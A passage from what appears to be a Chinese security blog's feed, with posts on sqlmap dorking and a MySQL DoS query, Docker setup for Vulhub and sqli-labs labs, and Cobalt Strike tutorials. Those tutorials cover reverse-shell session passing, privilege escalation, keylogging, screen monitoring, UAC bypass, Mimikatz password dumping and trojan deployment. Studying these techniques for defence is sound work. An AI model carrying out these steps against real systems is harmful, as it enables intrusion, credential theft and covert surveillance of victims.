<li>查找页面：<code>sqlmap.py -g inurl:php?id=</code></li>
</ul>
<h2 id="sqlmpa进行Mysql-DOS攻击"><a href="#sqlmpa进行Mysql-DOS攻击" class="headerlink" title="sqlmpa进行Mysql DOS攻击"></a>sqlmpa进行Mysql DOS攻击</h2><ul>
<li>获得shell：<code>sqlmap.py -u url --sql-shell</code></li>
<li>进行攻击：<code>select benchmark(9999999999,0*70726f63409284209)</code></li>
</ul>
]]></content>
      <categories>
        <category>Penetration test</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker之快速搭建漏洞环境</title>
    <url>/2019/11/20/docker%E4%B9%8B%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<p>本文主要介绍Mac/Linux下使用docker快速搭建漏洞环境</p><h2 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h2><p>各类环境安装docker可参考菜鸟教程</p><h2 id="sqli-lab实验环境安装"><a href="#sqli-lab实验环境安装" class="headerlink" title="sqli_lab实验环境安装"></a>sqli_lab实验环境安装</h2><p>搜索sqli_lab镜像<code>docker search sqli</code></p><p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-1.png" alt="docker-1"></p><p>拉去镜像sqli_lab镜像<code>docker pull acgpiano/sqli-labs</code></p><p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-2.png" alt="docker-2"></p><p><code>docker images</code>查看本地镜像</p><a id="more"></a>






<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-3.png" alt="docker-3"></p>
<p> <code>docker run -itd --name sqli -p 80:80 --rm acgpiano/sqli-labs</code>启动镜像</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-4.png" alt="docker-4"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker #Docker 的二进制执行文件</span><br><span class="line">run #与前面的 docker 组合来运行一个容器</span><br><span class="line">-i #在新容器内指定一个伪终端或终端</span><br><span class="line">-t #允许你对容器内的标准输入 (STDIN) 进行交互，一般与-i同时使用</span><br><span class="line">-d #后台运行</span><br><span class="line">--name sqli #将启动后的容器取名sqli</span><br><span class="line">-p 80:80 #将容器的80端口映射到本机80端口</span><br><span class="line">--rm #容器停止后自动删除</span><br><span class="line">acgpiano/sqli-labs #指定要运行的镜像</span><br></pre></td></tr></table></figure>

<p>如果要直接以交互式启动镜像，可以用如下命令</p>
<p><code>docker run -it --name sqli -p 80:80 --rm acgpiano/sqli-labs /bin/bash</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/bin/bash #执行的命令</span><br></pre></td></tr></table></figure>

<p><code>docker ps</code>查看正在运行的容器，container id为容器id</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-5.png" alt="docker-5"></p>
<p><code>docker exec -it b18f718e141a /bin/bash</code>与容器进行交互</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-6.png" alt="docker-6"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">exec #进入容器</span><br><span class="line">b18f718e141a #容器id</span><br><span class="line">/bin/bash #执行的命令</span><br></pre></td></tr></table></figure>

<p>推荐使用 docker exec 命令，为此退出容器终端，不会导致容器的停止</p>
<p><code>docker stop sqli</code>停止容器</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-7.png" alt="docker-7"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sqli #启动镜像时--name设置的名称</span><br><span class="line">docker stop &lt;容器id&gt; 此命令也可停止容器</span><br></pre></td></tr></table></figure>

<p>进入容器查看路径</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-8.png" alt="docker-8"></p>
<p><code>docker cp dd5418a3c30a:/run.sh /Users/c0cho/Desktop/run</code>拷贝容器中的run.sh文件到本地桌面储存为run</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-9.png" alt="docker-9"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker cp #docker进行拷贝文件</span><br><span class="line">dd5418a3c30a:/run.sh #容器id下的文件路径</span><br><span class="line">/Users/c0cho/Desktop/run #要拷贝到本地文件路径和文件命名</span><br></pre></td></tr></table></figure>

<p><code>docker cp /Users/c0cho/Desktop/1 dd5418a3c30a:/1.sh</code>将本地文件1拷贝到容器为1.sh</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-10.png" alt="docker-10"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/Users/c0cho/Desktop/1  #本地文件路径</span><br><span class="line">dd5418a3c30a:/1.sh  #容器id下的文件保存路径</span><br></pre></td></tr></table></figure>

<p>docker容器中出现1.sh文件，拷贝成功</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-11.png" alt="docker-11"></p>
<p><code>docker ps -a</code>查看所有容器，包括已经停止的</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-12.png" alt="docker-12"></p>
<p><code>docker start ba5bbce018d0</code>或者<code>docker start sqli</code>启动已停止的docker</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-13.png" alt="docker-13"></p>
<p>图中ceshi文件夹为停止前加入，容器重新启动后文件夹依然存在，说明已经停止的容器可以保存更改</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-14.png" alt="docker-14"></p>
<p><code>docker rm ba5bbce018d0</code>删除容器ba5bbce018d0为容器id</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-15.png" alt="docker-15"></p>
<p><code>docker rmi 0976afc45249</code>删除镜像，如不能直接删除镜像，需要<code>docker ps -a</code>查看删除对应容器后才能删除镜像</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-16.png" alt="docker-16"></p>
<p>删除后<code>docker images</code>查看已无sqli_lab镜像</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-17.png" alt="docker-17"></p>
<h2 id="VPS安装docker"><a href="#VPS安装docker" class="headerlink" title="VPS安装docker"></a>VPS安装docker</h2><p>使用腾讯vps发现已自带docker，各类环境安装docker百度菜鸟教程</p>
<h2 id="docker快速搭建实验环境"><a href="#docker快速搭建实验环境" class="headerlink" title="docker快速搭建实验环境"></a>docker快速搭建实验环境</h2><p>安装docker-compose参考菜鸟教程</p>
<p>Vulhub漏洞环境下载，Windows主机，虚拟机，docker容器之间相互通信可参考：<a href="https://www.freebuf.com/column/204885.html" target="_blank" rel="noopener">https://www.freebuf.com/column/204885.html</a></p>
<p>安装完compose和vulhub之后将当前用户加入docker组</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-18.png" alt="docker-18"></p>
<p>重启docker</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-19.png" alt="docker-19"></p>
<p>下载vulhub后进入CVE-2017-10271漏洞目录，<code>docker-compose up -d</code>启动镜像</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-20.png" alt="docker-20"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-compose #Compose 是用于定义和运行多容器 Docker 应用程序的工具。通过 Compose，您可以使用 YML 文件来配置应用程序需要的所有服务。然后，使用一个命令，就可以从 YML 文件配置中创建并启动所有服务</span><br><span class="line">up #docker-compose up联用为启动镜像</span><br><span class="line">-d #后台执行</span><br></pre></td></tr></table></figure>

<p>查看到镜像已启动</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-21.png" alt="docker-21"></p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-22.png" alt="docker-22"></p>
<p><code>docker-compose down</code>关闭镜像</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-23.png" alt="docker-23"></p>
<h2 id="Nessus与exp测试CVE-2019-2729漏洞"><a href="#Nessus与exp测试CVE-2019-2729漏洞" class="headerlink" title="Nessus与exp测试CVE-2019-2729漏洞"></a>Nessus与exp测试CVE-2019-2729漏洞</h2><p>进入CVE-2017-10271漏洞目录，<code>docker-compose up -d</code>启动镜像</p>
<p>使用Nessus扫描可发现CVE-2019-2729漏洞</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-24.png" alt="docker-24"></p>
<p>网上查阅CVE-2019-2719漏洞临时修复过程如下</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-25.png" alt="docker-25"></p>
<p>删除搜索出来的war包</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-26.png" alt="docker-26"></p>
<p>将修改后的容器重新保存为镜像<code>docker commit 1c15c9b27f42 weblogic2019</code></p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-27.png" alt="docker-27"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker commit #从容器创建一个新的镜像</span><br><span class="line">1c15c91c15c9b27f42 #需要保存的容器id</span><br><span class="line">weblogic2019 #取一个新的名字为weblogic2019</span><br></pre></td></tr></table></figure>

<p>查看镜像多了一个weblogic2019的镜像文件</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-28.png" alt="docker-28"></p>
<p>重启启动镜像时需要查看之前漏洞目录下的docker-compose.yml配置文件，配置文件中将容器中的端口号7001映射到本机的7001</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-29.png" alt="docker-29"></p>
<p>启动镜像文件</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-30.png" alt="docker-30"></p>
<p>启动后使用Nessus扫描未发现CVE-2019-2729漏洞</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-31.png" alt="docker-31"></p>
<p>尝试使用exp，发现可以进行漏洞利用</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-32.png" alt="docker-32"></p>
<p>思考：应该是没有删除缓存目录，对缓存目录进行删除</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-33.png" alt="docker-33"></p>
<p><code>./startWeblogic.sh</code>重启weblogic</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-34.png" alt="docker-34"></p>
<p>再次使用Nessus扫描和exp均未发现CVE-2019-2729漏洞</p>
<p><img src="//choge.top/2019/11/20/docker之快速搭建漏洞环境/docker-35.png" alt="docker-35"></p>
<p>具体删除修复CVE-2019-2729参考：<a href="https://www.cnblogs.com/iamver/p/10945454.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamver/p/10945454.html</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>快速搭建漏洞环境与部署应用，如sqli_lab，DVWA，Nessus等</li>
<li>vuhub中一个漏洞环境可能可以测试多个漏洞</li>
<li>快速验证exp有效性和测试exp使用方法</li>
<li>可对漏洞尝试修复，修复后再次对比扫描器和exp，验证漏洞是否真实修复</li>
</ul>
]]></content>
      <categories>
        <category>Penetration test</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobalt Strike与Metasploit双向联动</title>
    <url>/2019/11/15/cs%E4%B8%8Emsf%E5%8F%8C%E5%90%91%E8%81%94%E5%8A%A8/</url>
    <content><![CDATA[<p>本文主要介绍msf与cs双向联动</p><h2 id="cs复制会话到msf"><a href="#cs复制会话到msf" class="headerlink" title="cs复制会话到msf"></a>cs复制会话到msf</h2><p>添加一个监听器，payload选择外部监听器<code>windows/foreign/reverse_tcp</code></p><p><img src="//choge.top/2019/11/15/cs与msf双向联动/cs-1.png" alt="cs-1"></p><p><img src="//choge.top/2019/11/15/cs与msf双向联动/cs-2.png" alt="cs-2"></p><p>msf选择<code>exploit/multi/handler</code>并配置如下，LHOST和LPORT要与cs的监听器对应，payload使用<code>windows/meterpreter/reverse_tcp</code>测试过程中目标机为win2008x64，但如设置x64会出错，此处应根据监听器配置不选择x64位配置</p><a id="more"></a>




<p><img src="//choge.top/2019/11/15/cs与msf双向联动/cs-3.png" alt="cs-3"></p>
<p>回到cs选择Spawn</p>
<p><img src="//choge.top/2019/11/15/cs与msf双向联动/cs-4.png" alt="cs-4"></p>
<p>msf复制会话成功</p>
<p><img src="//choge.top/2019/11/15/cs与msf双向联动/cs-5.png" alt="cs-5"></p>
<h2 id="msf复制会话到cs"><a href="#msf复制会话到cs" class="headerlink" title="msf复制会话到cs"></a>msf复制会话到cs</h2><p>将msf已有meterpreter放入后台，选择<code>exploit/windows/local/payload_inject</code>模块将payload注入到cs中</p>
<p><img src="//choge.top/2019/11/15/cs与msf双向联动/cs-6.png" alt="cs-6"></p>
<p>配置如下，session选择需要注入到cs的meterpreter，payload选择<code>windows/meterpreter/reverse_http</code>注意是反弹http</p>
<p><img src="//choge.top/2019/11/15/cs与msf双向联动/cs-7.png" alt="cs-7"></p>
<p>cs下新建监听器，设置选项与msf设置一一对应，此处注意不能使用域名上线</p>
<p><img src="//choge.top/2019/11/15/cs与msf双向联动/cs-8.png" alt></p>
<p><img src="//choge.top/2019/11/15/cs与msf双向联动/cs-9.png" alt="cs-9"></p>
<p>msf执行exploit</p>
<p><img src="//choge.top/2019/11/15/cs与msf双向联动/cs-10.png" alt="cs-10"></p>
<p>cs成功复制会话</p>
<p><img src="//choge.top/2019/11/15/cs与msf双向联动/cs-11.png" alt="cs-11"></p>
]]></content>
      <categories>
        <category>Cobalt Strike</category>
      </categories>
      <tags>
        <tag>cs</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobalt Strike之windows提权</title>
    <url>/2019/11/14/cs%E4%B9%8Bwindows%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<p>本文主要介绍cs对windows提权的几种方法</p><h2 id="cs脚本提权"><a href="#cs脚本提权" class="headerlink" title="cs脚本提权"></a>cs脚本提权</h2><p>Script Manager加载脚本</p><p><img src="//choge.top/2019/11/14/cs之windows提权/cs-1.png" alt="cs-1"></p><p>Load加载脚本</p><p><img src="//choge.top/2019/11/14/cs之windows提权/cs-2.png" alt="cs-2"></p><p><img src="//choge.top/2019/11/14/cs之windows提权/cs-3.png" alt="cs-3"></p><p>加载后提权选项选择对应监听器和Exploit</p><p><img src="//choge.top/2019/11/14/cs之windows提权/cs-4.png" alt="cs-4"></p><p>提权成功，新增一个system权限服务</p><p><img src="//choge.top/2019/11/14/cs之windows提权/cs-5.png" alt="cs-5"></p><h2 id="powershell提权"><a href="#powershell提权" class="headerlink" title="powershell提权"></a>powershell提权</h2><p><code>powershell-import</code>加载powershell本地脚本</p><p><img src="//choge.top/2019/11/14/cs之windows提权/cs-6.png" alt="cs-6"></p><p><code>powershell Invoke-MS16-032</code>执行powershell脚本</p><a id="more"></a>












<p><img src="//choge.top/2019/11/14/cs之windows提权/cs-7.png" alt="cs-7"></p>
<p>powershell执行成功后会在目标机本地打开shell，执行脚本为system权限</p>
<p><img src="//choge.top/2019/11/14/cs之windows提权/cs-8.png" alt="cs-8"></p>
<p>由于此脚本执行powershell后只能在目标机本地执行命令，实战情况下谨慎使用。</p>
<p>网上一处修改MS16-032脚本可反弹shell参考链接：<a href="https://www.cnblogs.com/xiaoxiaoleo/p/8594839.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaoxiaoleo/p/8594839.html</a></p>
<h2 id="exe文件提权"><a href="#exe文件提权" class="headerlink" title="exe文件提权"></a>exe文件提权</h2><p>upload加载CVE-2019-0803</p>
<p><img src="//choge.top/2019/11/14/cs之windows提权/cs-9.png" alt="cs-9"></p>
<p>执行<code>shell CVE-2019-0803 shell &quot;whoami&quot;</code></p>
<p><img src="//choge.top/2019/11/14/cs之windows提权/cs-10.png" alt="cs-10"></p>
<p>返回如下，提权成功</p>
<p><img src="//choge.top/2019/11/14/cs之windows提权/cs-11.png" alt="cs-11"></p>
<p>提权脚本参考：</p>
<p><a href="https://github.com/k8gege/K8tools/" target="_blank" rel="noopener">https://github.com/k8gege/K8tools/</a></p>
<p><a href="https://github.com/SecWiki/windows-kernel-exploits/" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits/</a></p>
<p><a href="https://github.com/rsmudge/ElevateKit" target="_blank" rel="noopener">https://github.com/rsmudge/ElevateKit</a></p>
]]></content>
      <categories>
        <category>Cobalt Strike</category>
      </categories>
      <tags>
        <tag>cs</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobalt Strike之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作</title>
    <url>/2019/11/14/cs%E4%B9%8B%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86%E3%80%81%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%E3%80%81%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E3%80%81%E5%B1%8F%E5%B9%95%E7%9B%91%E6%8E%A7%E3%80%81%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<p>本文主要介绍cs的进程管理、屏幕截图、键盘记录、屏幕监控和文件操作等强大功能</p><h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><p>在cs获取的服务上右键Explorer–&gt;Process List获取进程信息</p><p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-1.png" alt="cs-1"></p><p>选择session1的explorer.exe，点击对Inject对进程进行注入</p><p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-2.png" alt="cs-2"></p><p>选择监听器</p><p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-3.png" alt="cs-3"></p><p>如图获取一个新的远程控制服务</p><p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-4.png" alt="cs-4"></p><h2 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h2><p>选择session1的explorer.exe进程，点击Screenshot对屏幕进行截图</p><a id="more"></a>









<p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-4.png" alt="cs-4"></p>
<p>输入时间表示几秒后进行截图</p>
<p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-5.png" alt="cs-5"></p>
<p>点击图片查看截图</p>
<p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-6.png" alt="cs-6"></p>
<p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-7.png" alt="cs-7"></p>
<p>此时获取一个高权限服务，同时使用远程桌面登录administrator用户，查看进程可以发现两个session，对session2用户进行注入获取屏幕截图</p>
<p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-8.png" alt="cs-8"></p>
<p>截屏为adminisrator用户</p>
<p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-9.png" alt="cs-9"></p>
<h2 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h2><p>对session1用户使用explorer.exe进行键盘记录(Log Kwystrokes)</p>
<p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-10.png" alt="cs-10"></p>
<p>进入C0cho桌面，输入内容如下</p>
<p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-11.png" alt="cs-11"></p>
<p>点击钥匙按钮获取键盘记录</p>
<p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-12.png" alt="cs-12"></p>
<p>键盘记录如下</p>
<p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-13.png" alt="cs-13"></p>
<p>此时在远程桌面administrator用户下输入如下内容</p>
<p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-14.png" alt="cs-14"></p>
<p>查看键盘记录并未产生记录</p>
<p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-15.png" alt="cs-15"></p>
<p>此时使用session2，administrato的explorer.exe进行键盘记录</p>
<p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-16.png" alt="cs-16"></p>
<p>在远程桌面administrator用户下输入如下内容</p>
<p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-17.png" alt="cs-17"></p>
<p>查看键盘记录已记录</p>
<p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-18.png" alt="cs-18"></p>
<p>回到C0cho桌面输入如下内容</p>
<p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-19.png" alt="cs-19"></p>
<p>查看键盘记录发现已记录</p>
<p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-20.png" alt="cs-20"></p>
<p>总结：提权后高权限session可以记录原本低权限session的键盘记录，原低权限session无法记录高权限session的键盘记录</p>
<h2 id="屏幕监控"><a href="#屏幕监控" class="headerlink" title="屏幕监控"></a>屏幕监控</h2><p>如下路径获取屏幕监控</p>
<p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-21.png" alt="cs-21"></p>
<p>ctrl+w可全屏显示</p>
<p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-22.png" alt="cs-22"></p>
<p>屏幕监控命令行操作如下</p>
<p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-23.png" alt="cs-23"></p>
<p>尝试获取session2的屏幕，选择PID为664的进程进行屏幕监控</p>
<p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-24.png" alt="cs-24"></p>
<p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-25.png" alt="cs-25"></p>
<p>成功获取session2屏幕，图中下方图标从左到右第2个可以对屏幕进行控制操作或锁定不操作，从右到左第4个为Ctrl+Alt+Del，其余图标功能和图标内容相同</p>
<p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-26.png" alt="cs-26"></p>
<h2 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h2><p>如下路径可进行文件操作</p>
<p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-27.png" alt="cs-27"></p>
<p>选中文件右键可对文件进行Copy(copy结果为路径)，Download(下载文件)，Execute(可以对exe直接进行执行)，Delete(删除文件)。</p>
<p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-28.png" alt="cs-28"></p>
<p>下载文件后点击下载按钮</p>
<p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-29.png" alt="cs-29"></p>
<p>Sync Files可同步到本地</p>
<p><img src="//choge.top/2019/11/14/cs之进程管理、屏幕截图、键盘记录、屏幕监控、文件操作/cs-30.png" alt="cs-30"></p>
]]></content>
      <categories>
        <category>Cobalt Strike</category>
      </categories>
      <tags>
        <tag>cs</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobalt Strike之uac绕过和明文密码获取</title>
    <url>/2019/11/13/cs%E4%B9%8Buac%E7%BB%95%E8%BF%87%E5%92%8C%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/</url>
    <content><![CDATA[<p>本文主要介绍cs的uac绕过和明文密码获取</p><h2 id="uac绕过"><a href="#uac绕过" class="headerlink" title="uac绕过"></a>uac绕过</h2><p>右键session获取hash，由于权限不足，无法获取</p><p><img src="//choge.top/2019/11/13/cs之uac绕过和明文密码获取/cs-1.png" alt="cs-1"></p><p>如下路径进行提权</p><p><img src="//choge.top/2019/11/13/cs之uac绕过和明文密码获取/cs-2.png" alt="cs-2"></p><p>选择对应监听器，选择uac-dll进行uac绕过</p><p><img src="//choge.top/2019/11/13/cs之uac绕过和明文密码获取/cs-3.png" alt="cs-3"></p><p>uac成功绕过后会产生一个新的外框为红色并且有白色爪子抓住的session</p><p><img src="//choge.top/2019/11/13/cs之uac绕过和明文密码获取/cs-4.png" alt="cs-4"></p><p>获取哈希成功</p><p><img src="//choge.top/2019/11/13/cs之uac绕过和明文密码获取/cs-5.png" alt="cs-5"></p><p>国内网站破解哈希成功<a href="https://www.cmd5.com/" target="_blank" rel="noopener">https://www.cmd5.com/</a></p><a id="more"></a>











<p><img src="//choge.top/2019/11/13/cs之uac绕过和明文密码获取/cs-6.png" alt="cs-6"></p>
<p>国外网站破解哈希成功<a href="https://www.objectif-securite.ch/ophcrack" target="_blank" rel="noopener">https://www.objectif-securite.ch/ophcrack</a></p>
<p><img src="//choge.top/2019/11/13/cs之uac绕过和明文密码获取/cs-7.png" alt="cs-7"></p>
<p>选择uac-token-duplication进行uac绕过</p>
<p><img src="//choge.top/2019/11/13/cs之uac绕过和明文密码获取/cs-8.png" alt="cs-8"></p>
<p>绕过成功，但无法获取hash</p>
<p><img src="//choge.top/2019/11/13/cs之uac绕过和明文密码获取/cs-10.png" alt="cs-10"></p>
<h2 id="获取明文密码"><a href="#获取明文密码" class="headerlink" title="获取明文密码"></a>获取明文密码</h2><p>对获取权限的session右键，Access-Run MImikatz进行明文密码获取</p>
<p><img src="//choge.top/2019/11/13/cs之uac绕过和明文密码获取/cs-12.png" alt="cs-12"></p>
<p>成功获取明文密码，此处密码为空</p>
<p><img src="//choge.top/2019/11/13/cs之uac绕过和明文密码获取/cs-13.png" alt="cs-13"></p>
<p>点击凭证按钮，可展示session详细hash等信息</p>
<p><img src="//choge.top/2019/11/13/cs之uac绕过和明文密码获取/cs-14.png" alt="cs-14"></p>
]]></content>
      <categories>
        <category>Cobalt Strike</category>
      </categories>
      <tags>
        <tag>cs</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobalt Strike之http基础上线</title>
    <url>/2019/11/13/cs%E4%B9%8B%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%BA%BF/</url>
    <content><![CDATA[<p>本文主要介绍cs的http基础上线</p><h2 id="IP地址上线"><a href="#IP地址上线" class="headerlink" title="IP地址上线"></a>IP地址上线</h2><p>启动监听器</p><p><img src="//choge.top/2019/11/13/cs之基础上线/cs-1.png" alt="cs-1"></p><p>ADD添加</p><p><img src="//choge.top/2019/11/13/cs之基础上线/cs-2.png" alt="cs-2"></p><p>设置监听器，Name填写监听器的描述，选择Payload，Host为vps地址，Port为要设置的监听端口</p><p><img src="//choge.top/2019/11/13/cs之基础上线/cs-3.png" alt="cs-3"></p><p><img src="//choge.top/2019/11/13/cs之基础上线/cs-4.png" alt="cs-4"></p><p>添加成功</p><p><img src="//choge.top/2019/11/13/cs之基础上线/cs-5.png" alt="cs-5"></p><p>如下图路径生成木马文件</p><p><img src="//choge.top/2019/11/13/cs之基础上线/cs-6.png" alt="cs-6"></p><p>选择对应监听器和输出格式，如果目标机为x64系统需要在对应位置打勾</p><p><img src="//choge.top/2019/11/13/cs之基础上线/cs-7.png" alt="cs-7"></p><p>目标机执行木马文件后成功上线</p><p><img src="//choge.top/2019/11/13/cs之基础上线/cs-8.png" alt="cs-8"></p><p>在目标机访问vps的监听端口，日志会有相应记录(View-Web Log进入)，此方法也可以判断目标机是否可以出网</p><a id="more"></a>
















<p><img src="//choge.top/2019/11/13/cs之基础上线/cs-9.png" alt="cs-9"></p>
<p>last栏默认为60s，木马会每隔60s连接一下teamserver，若teamserver有任务则会下载执行任务，然后返回给teamserver，若没有任务则60s后再连接一次查看任务，可以将sleep设置为4，以便快速执行任务</p>
<p><img src="//choge.top/2019/11/13/cs之基础上线/cs-10.png" alt="cs-10"></p>
<p><img src="//choge.top/2019/11/13/cs之基础上线/cs-11.png" alt="cs-11"></p>
<p>session右键Interact可进入beacon执行命令，如<code>sleep 4</code>，执行Windows命令则需要在前面加上shell，如<code>shell whoami</code></p>
<p><img src="//choge.top/2019/11/13/cs之基础上线/cs-12.png" alt="cs-12"></p>
<h2 id="域名上线"><a href="#域名上线" class="headerlink" title="域名上线"></a>域名上线</h2><p>设置方法同IP上线，只需要在设置IP的位置设置为域名，域名需要指向teamserver服务器</p>
<p><img src="//choge.top/2019/11/13/cs之基础上线/cs-14.png" alt="cs-14"></p>
<p><img src="//choge.top/2019/11/13/cs之基础上线/cs-15.png" alt="cs-15"></p>
<p>设置Listener为domain</p>
<p><img src="//choge.top/2019/11/13/cs之基础上线/cs-16.png" alt="cs-16"></p>
<p>上线成功</p>
<p><img src="//choge.top/2019/11/13/cs之基础上线/cs-17.png" alt="cs-17"></p>
<h2 id="https上线"><a href="#https上线" class="headerlink" title="https上线"></a>https上线</h2><p>https上线操作同上，测试成功，截图略。https为加密传输，理论上比http更安全。</p>
]]></content>
      <categories>
        <category>Cobalt Strike</category>
      </categories>
      <tags>
